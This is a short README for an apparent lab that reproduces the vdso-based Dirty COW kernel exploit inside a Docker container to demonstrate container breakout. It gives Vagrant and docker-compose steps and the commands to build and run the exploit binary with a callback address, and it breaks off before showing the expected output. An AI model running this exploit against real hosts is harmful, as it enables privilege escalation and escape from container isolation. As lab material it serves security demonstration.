# dirtycow-docker-vdso_2

This directory contains the necessary code to get the vdso based Dirty Cow POC working inside a docker container. 
All the really exciting stuff was done by Scumjr, see his POC repo over at https://github.com/scumjr/dirtycow-vdso.
This exploit is from  https://github.com/gebl/dirtycow-docker-vdso.git'}

This exploit is similar that dirtycow-docker-vdso_1 with exception no seperate user is created 

To execute:
``
	vagrant up
	vagrant putty
``

Once inside the VM run to launch the Docker Container:
``
	sudo docker-compose run dirtycow /bin/bash" 
``

Inside the Docker container run:
``
    cd /dirtycow-vdso
     make
     ./0xdeadbeef 172.18.0.2:1234" 
``      

Wait a few minutes for the exploit to launch 

Show the breakout of the container by running 

``
ifconfig
``	

Succesful breakout should list

	
  
